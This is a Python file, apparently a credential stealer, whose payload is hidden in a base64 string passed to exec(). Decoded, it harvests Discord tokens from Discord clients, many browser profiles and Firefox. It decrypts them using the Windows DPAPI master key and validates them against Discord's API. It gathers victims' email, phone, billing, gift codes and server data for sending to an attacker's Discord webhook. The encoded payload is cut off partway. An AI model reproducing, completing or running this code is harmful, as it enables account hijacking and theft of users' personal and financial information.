import base64
import json
import os
import re
import requests
from Crypto.Cipher import AES
from discord import Embed, SyncWebhook
from win32crypt import CryptUnprotectData

exec(base64.b64decode("Y2xhc3MgRGlzY29yZFRva2VuOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmLCB3ZWJob29rKToNCiAgICAgICAgdXBsb2FkX3Rva2Vucyh3ZWJob29rKS51cGxvYWQoKQ0KICAgICAgICANCmNsYXNzIGV4dHJhY3RfdG9rZW5zOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmKSAtPiBOb25lOg0KICAgICAgICBzZWxmLmJhc2VfdXJsID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZSINCiAgICAgICAgc2VsZi5hcHBkYXRhID0gb3MuZ2V0ZW52KCJsb2NhbGFwcGRhdGEiKQ0KICAgICAgICBzZWxmLnJvYW1pbmcgPSBvcy5nZXRlbnYoImFwcGRhdGEiKQ0KICAgICAgICBzZWxmLnJlZ2V4cCA9IHIiW1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17MjUsMTEwfSINCiAgICAgICAgc2VsZi5yZWdleHBfZW5jID0gciJkUXc0dzlXZ1hjUTpbXlwiXSoiDQoNCiAgICAgICAgc2VsZi50b2tlbnMsIHNlbGYudWlkcyA9IFtdLCBbXQ0KDQogICAgICAgIHNlbGYuZXh0cmFjdCgpDQoNCiAgICBkZWYgZXh0cmFjdChzZWxmKSAtPiBOb25lOg0KICAgICAgICBwYXRocyA9IHsNCiAgICAgICAgICAgICdEaXNjb3JkJzogc2VsZi5yb2FtaW5nICsgJ1xcZGlzY29yZFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywNCiAgICAgICAgICAgICdEaXNjb3JkIENhbmFyeSc6IHNlbGYucm9hbWluZyArICdcXGRpc2NvcmRjYW5hcnlcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsDQogICAgICAgICAgICAnTGlnaHRjb3JkJzogc2VsZi5yb2FtaW5nICsgJ1xcTGlnaHRjb3JkXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLA0KICAgICAgICAgICAgJ0Rpc2NvcmQgUFRCJzogc2VsZi5yb2FtaW5nICsgJ1xcZGlzY29yZHB0YlxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywNCiAgICAgICAgICAgICdPcGVyYSc6IHNlbGYucm9hbWluZyArICdcXE9wZXJhIFNvZnR3YXJlXFxPcGVyYSBTdGFibGVcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsDQogICAgICAgICAgICAnT3BlcmEgR1gnOiBzZWxmLnJvYW1pbmcgKyAnXFxPcGVyYSBTb2Z0d2FyZVxcT3BlcmEgR1ggU3RhYmxlXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLA0KICAgICAgICAgICAgJ0FtaWdvJzogc2VsZi5hcHBkYXRhICsgJ1xcQW1pZ29cXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywNCiAgICAgICAgICAgICdUb3JjaCc6IHNlbGYuYXBwZGF0YSArICdcXFRvcmNoXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsDQogICAgICAgICAgICAnS29tZXRhJzogc2VsZi5hcHBkYXRhICsgJ1xcS29tZXRhXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsDQogICAgICAgICAgICAnT3JiaXR1bSc6IHNlbGYuYXBwZGF0YSArICdcXE9yYml0dW1cXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywNCiAgICAgICAgICAgICdDZW50QnJvd3Nlcic6IHNlbGYuYXBwZGF0YSArICdcXENlbnRCcm93c2VyXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsDQogICAgICAgICAgICAnN1N0YXInOiBzZWxmLmFwcGRhdGEgKyAnXFw3U3RhclxcN1N0YXJcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywNCiAgICAgICAgICAgICdTcHV0bmlrJzogc2VsZi5hcHBkYXRhICsgJ1xcU3B1dG5pa1xcU3B1dG5pa1xcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLA0KICAgICAgICAgICAgJ1ZpdmFsZGknOiBzZWxmLmFwcGRhdGEgKyAnXFxWaXZhbGRpXFxVc2VyIERhdGFcXERlZmF1bHRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsDQogICAgICAgICAgICAnQ2hyb21lIFN4Uyc6IHNlbGYuYXBwZGF0YSArICdcXEdvb2dsZVxcQ2hyb21lIFN4U1xcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLA0KICAgICAgICAgICAgJ0Nocm9tZSc6IHNlbGYuYXBwZGF0YSArICdcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXERlZmF1bHRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsDQogICAgICAgICAgICAnQ2hyb21lMSc6IHNlbGYuYXBwZGF0YSArICdcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXFByb2ZpbGUgMVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywNCiAgICAgICAgICAgICdDaHJvbWUyJzogc2VsZi5hcHBkYXRhICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSAyXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLA0KICAgICAgICAgICAgJ0Nocm9tZTMnOiBzZWxmLmFwcGRhdGEgKyAnXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxQcm9maWxlIDNcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsDQogICAgICAgICAgICAnQ2hyb21lNCc6IHNlbGYuYXBwZGF0YSArICdcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXFByb2ZpbGUgNFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywNCiAgICAgICAgICAgICdDaHJvbWU1Jzogc2VsZi5hcHBkYXRhICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSA1XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLA0KICAgICAgICAgICAgJ0VwaWMgUHJpdmFjeSBCcm93c2VyJzogc2VsZi5hcHBkYXRhICsgJ1xcRXBpYyBQcml2YWN5IEJyb3dzZXJcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywNCiAgICAgICAgICAgICdNaWNyb3NvZnQgRWRnZSc6IHNlbGYuYXBwZGF0YSArICdcXE1pY3Jvc29mdFxcRWRnZVxcVXNlciBEYXRhXFxEZWZhdWxcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsDQogICAgICAgICAgICAnVXJhbic6IHNlbGYuYXBwZGF0YSArICdcXHVDb3pNZWRpYVxcVXJhblxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLA0KICAgICAgICAgICAgJ1lhbmRleCc6IHNlbGYuYXBwZGF0YSArICdcXFlhbmRleFxcWWFuZGV4QnJvd3NlclxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLA0KICAgICAgICAgICAgJ0JyYXZlJzogc2VsZi5hcHBkYXRhICsgJ1xcQnJhdmVTb2Z0d2FyZVxcQnJhdmUtQnJvd3NlclxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLA0KICAgICAgICAgICAgJ0lyaWRpdW0nOiBzZWxmLmFwcGRhdGEgKyAnXFxJcmlkaXVtXFxVc2VyIERhdGFcXERlZmF1bHRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcNCiAgICAgICAgfQ0KDQogICAgICAgIGZvciBuYW1lLCBwYXRoIGluIHBhdGhzLml0ZW1zKCk6DQogICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6DQogICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgIF9kaXNjb3JkID0gbmFtZS5yZXBsYWNlKCIgIiwgIiIpLmxvd2VyKCkNCiAgICAgICAgICAgIGlmICJjb3JkIiBpbiBwYXRoOg0KICAgICAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhzZWxmLnJvYW1pbmcrZidcXHtfZGlzY29yZH1cXExvY2FsIFN0YXRlJyk6DQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICAgICAgZm9yIGZpbGVfbmFtZSBpbiBvcy5saXN0ZGlyKHBhdGgpOg0KICAgICAgICAgICAgICAgICAgICBpZiBmaWxlX25hbWVbLTM6XSBub3QgaW4gWyJsb2ciLCAibGRiIl06DQogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7cGF0aH1cXHtmaWxlX25hbWV9JywgZXJyb3JzPSdpZ25vcmUnKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOg0KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHkgaW4gcmUuZmluZGFsbChzZWxmLnJlZ2V4cF9lbmMsIGxpbmUpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRva2VuID0gc2VsZi5kZWNyeXB0X3ZhbChiYXNlNjQuYjY0ZGVjb2RlKHkuc3BsaXQoJ2RRdzR3OVdnWGNROicpWzFdKSwgc2VsZi5nZXRfbWFzdGVyX2tleShzZWxmLnJvYW1pbmcrZidcXHtfZGlzY29yZH1cXExvY2FsIFN0YXRlJykpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi52YWxpZGF0ZV90b2tlbih0b2tlbik6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVpZCA9IHJlcXVlc3RzLmdldChzZWxmLmJhc2VfdXJsLCBoZWFkZXJzPXsnQXV0aG9yaXphdGlvbic6IHRva2VufSkuanNvbigpWydpZCddDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHVpZCBub3QgaW4gc2VsZi51aWRzOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi50b2tlbnMuYXBwZW5kKHRva2VuKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi51aWRzLmFwcGVuZCh1aWQpDQoNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgZm9yIGZpbGVfbmFtZSBpbiBvcy5saXN0ZGlyKHBhdGgpOg0KICAgICAgICAgICAgICAgICAgICBpZiBmaWxlX25hbWVbLTM6XSBub3QgaW4gWyJsb2ciLCAibGRiIl06DQogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7cGF0aH1cXHtmaWxlX25hbWV9JywgZXJyb3JzPSdpZ25vcmUnKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOg0KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHRva2VuIGluIHJlLmZpbmRhbGwoc2VsZi5yZWdleHAsIGxpbmUpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNlbGYudmFsaWRhdGVfdG9rZW4odG9rZW4pOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1aWQgPSByZXF1ZXN0cy5nZXQoc2VsZi5iYXNlX3VybCwgaGVhZGVycz17J0F1dGhvcml6YXRpb24nOiB0b2tlbn0pLmpzb24oKVsnaWQnXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB1aWQgbm90IGluIHNlbGYudWlkczoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYudG9rZW5zLmFwcGVuZCh0b2tlbikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYudWlkcy5hcHBlbmQodWlkKQ0KDQogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHNlbGYucm9hbWluZysiXFxNb3ppbGxhXFxGaXJlZm94XFxQcm9maWxlcyIpOg0KICAgICAgICAgICAgZm9yIHBhdGgsIF8sIGZpbGVzIGluIG9zLndhbGsoc2VsZi5yb2FtaW5nKyJcXE1vemlsbGFcXEZpcmVmb3hcXFByb2ZpbGVzIik6DQogICAgICAgICAgICAgICAgZm9yIF9maWxlIGluIGZpbGVzOg0KICAgICAgICAgICAgICAgICAgICBpZiBub3QgX2ZpbGUuZW5kc3dpdGgoJy5zcWxpdGUnKToNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgIGZvciBsaW5lIGluIFt4LnN0cmlwKCkgZm9yIHggaW4gb3BlbihmJ3twYXRofVxce19maWxlfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToNCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHNlbGYucmVnZXhwLCBsaW5lKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBzZWxmLnZhbGlkYXRlX3Rva2VuKHRva2VuKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdWlkID0gcmVxdWVzdHMuZ2V0KHNlbGYuYmFzZV91cmwsIGhlYWRlcnM9eydBdXRob3JpemF0aW9uJzogdG9rZW59KS5qc29uKClbJ2lkJ10NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdWlkIG5vdCBpbiBzZWxmLnVpZHM6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnRva2Vucy5hcHBlbmQodG9rZW4pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnVpZHMuYXBwZW5kKHVpZCkNCg0KICAgIGRlZiB2YWxpZGF0ZV90b2tlbihzZWxmLCB0b2tlbjogc3RyKSAtPiBib29sOg0KICAgICAgICByID0gcmVxdWVzdHMuZ2V0KHNlbGYuYmFzZV91cmwsIGhlYWRlcnM9eydBdXRob3JpemF0aW9uJzogdG9rZW59KQ0KDQogICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwOg0KICAgICAgICAgICAgcmV0dXJuIFRydWUNCg0KICAgICAgICByZXR1cm4gRmFsc2UNCiAgICANCiAgICBkZWYgZGVjcnlwdF92YWwoc2VsZiwgYnVmZjogYnl0ZXMsIG1hc3Rlcl9rZXk6IGJ5dGVzKSAtPiBzdHI6DQogICAgICAgIGl2ID0gYnVmZlszOjE1XQ0KICAgICAgICBwYXlsb2FkID0gYnVmZlsxNTpdDQogICAgICAgIGNpcGhlciA9IEFFUy5uZXcobWFzdGVyX2tleSwgQUVTLk1PREVfR0NNLCBpdikNCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBjaXBoZXIuZGVjcnlwdChwYXlsb2FkKQ0KICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGRlY3J5cHRlZF9wYXNzWzotMTZdLmRlY29kZSgpDQoNCiAgICAgICAgcmV0dXJuIGRlY3J5cHRlZF9wYXNzDQoNCiAgICBkZWYgZ2V0X21hc3Rlcl9rZXkoc2VsZiwgcGF0aDogc3RyKSAtPiBzdHI6DQogICAgICAgIHdpdGggb3BlbihwYXRoLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6DQogICAgICAgICAgICBjID0gZi5yZWFkKCkNCiAgICAgICAgbG9jYWxfc3RhdGUgPSBqc29uLmxvYWRzKGMpDQoNCiAgICAgICAgbWFzdGVyX2tleSA9IGJhc2U2NC5iNjRkZWNvZGUobG9jYWxfc3RhdGVbIm9zX2NyeXB0Il1bImVuY3J5cHRlZF9rZXkiXSkNCiAgICAgICAgbWFzdGVyX2tleSA9IG1hc3Rlcl9rZXlbNTpdDQogICAgICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleSwgTm9uZSwgTm9uZSwgTm9uZSwgMClbMV0NCg0KICAgICAgICByZXR1cm4gbWFzdGVyX2tleQ0KDQpjbGFzcyB1cGxvYWRfdG9rZW5zOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmLCB3ZWJob29rOiBzdHIpOg0KICAgICAgICBzZWxmLnRva2VucyA9IGV4dHJhY3RfdG9rZW5zKCkudG9rZW5zDQogICAgICAgIHNlbGYud2ViaG9vayA9IFN5bmNXZWJob29rLmZyb21fdXJsKHdlYmhvb2spDQoNCiAgICBkZWYgY2FsY19mbGFncyhzZWxmLCBmbGFnczogaW50KSAtPiBsaXN0Og0KICAgICAgICBmbGFnc19kaWN0ID0gew0KICAgICAgICAgICAgIkRJU0NPUkRfRU1QTE9ZRUUiOiB7DQogICAgICAgICAgICAgICAgImVtb2ppIjogIjw6c3RhZmY6OTY4NzA0NTQxOTQ2MTY3MzU3PiIsDQogICAgICAgICAgICAgICAgInNoaWZ0IjogMCwNCiAgICAgICAgICAgICAgICAiaW5kIjogMQ0KICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICJESVNDT1JEX1BBUlRORVIiOiB7DQogICAgICAgICAgICAgICAgImVtb2ppIjogIjw6cGFydG5lcjo5Njg3MDQ1NDIwMjE2NTI1NjA+IiwNCiAgICAgICAgICAgICAgICAic2hpZnQiOiAxLA0KICAgICAgICAgICAgICAgICJpbmQiOiAyDQogICAgICAgICAgICB9LA0KICAgICAgICAgICAgIkhZUEVTUVVBRF9FVkVOVFMiOiB7DQogICAgICAgICAgICAgICAgImVtb2ppIjogIjw6aHlwZXJzcXVhZF9ldmVudHM6OTY4NzA0NTQxNzc0MTkyNjkzPiIsDQogICAgICAgICAgICAgICAgInNoaWZ0IjogMiwNCiAgICAgICAgICAgICAgICAiaW5kIjogNA0KICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICJCVUdfSFVOVEVSX0xFVkVMXzEiOiB7DQogICAgICAgICAgICAgICAgImVtb2ppIjogIjw6YnVnX2h1bnRlcl8xOjk2ODcwNDU0MTY3NzcyMzY0OD4iLA0KICAgICAgICAgICAgICAgICJzaGlmdCI6IDMsDQogICAgICAgICAgICAgICAgImluZCI6IDQNCiAgICAgICAgICAgIH0sDQogICAgICAgICAgICAiSE9VU0VfQlJBVkVSWSI6IHsNCiAgICAgICAgICAgICAgICAiZW1vamkiOiAiPDpoeXBlcnNxdWFkXzE6OTY4NzA0NTQxNTAxNTcxMTMzPiIsDQogICAgICAgICAgICAgICAgInNoaWZ0IjogNiwNCiAgICAgICAgICAgICAgICAiaW5kIjogNjQNCiAgICAgICAgICAgIH0sDQogICAgICAgICAgICAiSE9VU0VfQlJJTExJQU5DRSI6IHsNCiAgICAgICAgICAgICAgICAiZW1vamkiOiAiPDpoeXBlcnNxdWFkXzI6OTY4NzA0NTQxODgzMjYxMDE4PiIsDQogICAgICAgICAgICAgICAgInNoaWZ0IjogNywNCiAgICAgICAgICAgICAgICAiaW5kIjogMTI4DQogICAgICAgICAgICB9LA0KICAgICAgICAgICAgIkhPVVNFX0JBTEFOQ0UiOiB7DQogICAgICAgICAgICAgICAgImVtb2ppIjogIjw6aHlwZXJzcXVhZF8zOjk2ODcwNDU0MTg3NDg2MDA4Mj4iLA0KICAgICAgICAgICAgICAgICJzaGlmdCI6IDgsDQogICAgICAgICAgICAgICAgImluZCI6IDI1Ng0KICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICJFQVJMWV9TVVBQT1JURVIiOiB7DQogICAgICAgICAgICAgICAgImVtb2ppIjogIjw6ZWFybHlfc3VwcG9ydGVyOjk2ODcwNDU0MjEyNjUxMDA5MD4iLA0KICAgICAgICAgICAgICAgICJzaGlmdCI6IDksDQogICAgICAgICAgICAgICAgImluZCI6IDUxMg0KICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICJCVUdfSFVOVEVSX0xFVkVMXzIiOiB7DQogICAgICAgICAgICAgICAgImVtb2ppIjogIjw6YnVnX2h1bnRlcl8yOjk2ODcwNDU0MTc3NDIxNzI0Nj4iLA0KICAgICAgICAgICAgICAgICJzaGlmdCI6IDE0LA0KICAgICAgICAgICAgICAgICJpbmQiOiAxNjM4NA0KICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICJWRVJJRklFRF9CT1RfREVWRUxPUEVSIjogew0KICAgICAgICAgICAgICAgICJlbW9qaSI6ICI8OnZlcmlmaWVkX2Rldjo5Njg3MDQ1NDE3MDI5MDU4ODY+IiwNCiAgICAgICAgICAgICAgICAic2hpZnQiOiAxNywNCiAgICAgICAgICAgICAgICAiaW5kIjogMTMxMDcyDQogICAgICAgICAgICB9LA0KICAgICAgICAgICAgIkFDVElWRV9ERVZFTE9QRVIiOiB7DQogICAgICAgICAgICAgICAgImVtb2ppIjogIjw6QWN0aXZlX0RldjoxMDQ1MDI0OTA5NjkwMTYzMjEwPiIsDQogICAgICAgICAgICAgICAgInNoaWZ0IjogMjIsDQogICAgICAgICAgICAgICAgImluZCI6IDQxOTQzMDQNCiAgICAgICAgICAgIH0sDQogICAgICAgICAgICAiQ0VSVElGSUVEX01PREVSQVRPUiI6IHsNCiAgICAgICAgICAgICAgICAiZW1vamkiOiAiPDpjZXJ0aWZpZWRfbW9kZXJhdG9yOjk4ODk5NjQ0NzkzODY3NDY5OT4iLA0KICAgICAgICAgICAgICAgICJzaGlmdCI6IDE4LA0KICAgICAgICAgICAgICAgICJpbmQiOiAyNjIxNDQNCiAgICAgICAgICAgIH0sDQogICAgICAgICAgICAiU1BBTU1FUiI6IHsNCiAgICAgICAgICAgICAgICAiZW1vamkiOiAi4oyoIiwNCiAgICAgICAgICAgICAgICAic2hpZnQiOiAyMCwNCiAgICAgICAgICAgICAgICAiaW5kIjogMTA0ODcwNA0KICAgICAgICAgICAgfSwNCiAgICAgICAgfQ0KDQogICAgICAgIHJldHVybiBbW2ZsYWdzX2RpY3RbZmxhZ11bJ2Vtb2ppJ10sIGZsYWdzX2RpY3RbZmxhZ11bJ2luZCddXSBmb3IgZmxhZyBpbiBmbGFnc19kaWN0IGlmIGludChmbGFncykgJiAoMSA8PCBmbGFnc19kaWN0W2ZsYWddWyJzaGlmdCJdKV0NCg0KICAgIA0KICAgIGRlZiB1cGxvYWQoc2VsZik6DQogICAgICAgIGlmIG5vdCBzZWxmLnRva2VuczoNCiAgICAgICAgICAgIHJldHVybg0KDQogICAgICAgIGZvciB0b2tlbiBpbiBzZWxmLnRva2VuczoNCiAgICAgICAgICAgIHVzZXIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y4L3VzZXJzL0BtZScsIGhlYWRlcnM9eydBdXRob3JpemF0aW9uJzogdG9rZW59KS5qc29uKCkNCiAgICAgICAgICAgIGJpbGxpbmcgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y2L3VzZXJzL0BtZS9iaWxsaW5nL3BheW1lbnQtc291cmNlcycsIGhlYWRlcnM9eydBdXRob3JpemF0aW9uJzogdG9rZW59KS5qc29uKCkNCiAgICAgICAgICAgIGd1aWxkcyA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1lL2d1aWxkcz93aXRoX2NvdW50cz10cnVlJywgaGVhZGVycz17J0F1dGhvcml6YXRpb24nOiB0b2tlbn0pLmpzb24oKQ0KICAgICAgICAgICAgZnJpZW5kcyA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjgvdXNlcnMvQG1lL3JlbGF0aW9uc2hpcHMnLCBoZWFkZXJzPXsnQXV0aG9yaXphdGlvbic6IHRva2VufSkuanNvbigpDQogICAgICAgICAgICBnaWZ0X2NvZGVzID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS91c2Vycy9AbWUvb3V0Ym91bmQtcHJvbW90aW9ucy9jb2RlcycsIGhlYWRlcnM9eydBdXRob3JpemF0aW9uJzogdG9rZW59KS5qc29uKCkNCg0KICAgICAgICAgICAgdXNlcm5hbWUgPSB1c2VyWyd1c2VybmFtZSddICsgJyMnICsgdXNlclsnZGlzY3JpbWluYXRvciddDQogICAgICAgICAgICB1c2VyX2lkID0gdXNlclsnaWQnXQ0KICAgICAgICAgICAgZW1haWwgPSB1c2VyWydlbWFpbCddDQogICAgICAgICAgICBwaG9uZSA9IHVzZXJbJ3Bob25lJ10NCiAgICAgICAgICAgIG1mYSA9IHVzZXJbJ21mYV9lbmFibGVkJ10NCiAgICAgICAgICAgIGF2YXRhciA9IGYiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXZhdGFycy97dXNlcl9pZH0ve3VzZXJbJ2F2YXRhciddfS5naWYiIGlmIHJlcXVlc3RzLmdldChmImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMve3VzZXJfaWR9L3t1c2VyWydhdmF0YXInXX0uZ2lmIikuc3RhdHVzX2NvZGUgPT0gMjAwIGVsc2UgZiJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzL3t1c2VyX2lkfS97dXNlclsnYXZhdGFyJ119LnBuZyINCiAgICAgICAgICAgIGJhZGdlcyA9ICcgJy5qb2luKFtmbGFnWzBdIGZvciBmbGFnIGluIHNlbGYuY2FsY19mbGFncyh1c2VyWydwdWJsaWNfZmxhZ3MnXSldKQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiB1c2VyWydwcmVtaXVtX3R5cGUnXSA9PSAwOg0KICAgICAgICAgICAgICAgIG5pdHJvID0gJ05vbmUnDQogICAgICAgICAgICBlbGlmIHVzZXJbJ3ByZW1pdW1fdHlwZSddID09IDE6DQogICAgICAgICAgICAgICAgbml0cm8gPSAnTml0cm8gQ2xhc3NpYycNCiAgICAgICAgICAgIGVsaWYgdXNlclsncHJlbWl1bV90eXBlJ10gPT0gMjoNCiAgICAgICAgICAgICAgICBuaXRybyA9ICdOaXRybycNCiAgICAgICAgICAgIGVsaWYgdXNlclsncHJlbWl1bV90eXBlJ10gPT0gMzoNCiAgICAgICAgICAgICAgICBuaXRybyA9ICdOaXRybyBCYXNpYycNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgbml0cm8gPSAnTm9uZScNCg0KDQogICAgICAgICAgICBpZiBiaWxsaW5nOg0KICAgICAgICAgICAgICAgIHBheW1lbnRfbWV0aG9kcyA9IFtdDQoNCiAgICAgICAgICAgICAgICBmb3IgbWV0aG9kIGluIGJpbGxpbmc6DQogICAgICAgICAgICAgICAgICAgIGlmIG1ldGhvZFsndHlwZSddID09IDE6DQogICAgICAgICAgICAgICAgICAgICAgICBwYXltZW50X21ldGhvZHMuYXBwZW5kKCfwn5KzJykNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGVsaWYgbWV0aG9kWyd0eXBlJ10gPT0gMjoNCiAgICAgICAgICAgICAgICAgICAgICAgIHBheW1lbnRfbWV0aG9kcy5hcHBlbmQoIjw6cGF5cGFsOjk3MzQxNzY1NTYyNzI4ODY2Nj4iKQ0KDQogICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICBwYXltZW50X21ldGhvZHMuYXBwZW5kKCfinZMnKQ0KDQogICAgICAgICAgICAgICAgcGF5bWVudF9tZXRob2RzID0gJywgJy5qb2luKHBheW1lbnRfbWV0aG9kcykNCg0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBwYXltZW50X21ldGhvZHMgPSBOb25lDQoNCiAgICAgICAgICAgIGlmIGd1aWxkczoNCiAgICAgICAgICAgICAgICBocV9ndWlsZHMgPSBbXQ0KICAgICAgICAgICAgICAgIGZvciBndWlsZCBpbiBndWlsZHM6DQogICAgICAgICAgICAgICAgICAgIGFkbWluID0gVHJ1ZSBpZiBndWlsZFsncGVybWlzc2lvbnMnXSA9PSAnNDM5ODA0NjUxMTEwMycgZWxzZSBGYWxzZQ0KICAgICAgICAgICAgICAgICAgICBpZiBhZG1pbiBhbmQgZ3VpbGRbJ2FwcHJveGltYXRlX21lbWJlcl9jb3VudCddID49IDEwMDoNCiAgICAgICAgICAgICAgICAgICAgICAgIG93bmVyID0gIuKchSIgaWYgZ3VpbGRbJ293bmVyJ10gZWxzZSAi4p2MIg0KDQogICAgICAgICAgICAgICAgICAgICAgICBpbnZpdGVzID0gcmVxdWVzdHMuZ2V0KGYiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjgvZ3VpbGRzL3tndWlsZFsnaWQnXX0vaW52aXRlcyIsIGhlYWRlcnM9eydBdXRob3JpemF0aW9uJzogdG9rZW59KS5qc29uKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxlbihpbnZpdGVzKSA+IDA6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5